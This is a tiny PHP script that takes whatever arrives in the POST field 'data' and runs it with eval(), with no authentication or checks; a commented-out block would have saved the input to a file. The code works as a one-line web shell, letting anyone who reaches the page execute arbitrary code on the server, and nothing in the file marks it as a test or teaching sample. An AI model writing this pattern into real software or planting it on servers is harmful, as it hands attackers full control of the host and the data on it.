<?php
	if(!empty($_POST['data'])){
		$data = $_POST['data'];
		/*$fname = "code.txt";

		$file = fopen($fname, 'w');
		fwrite($file, $data);
		fclose($file);*/
		//echo $data;
		eval($data);
	}
?>
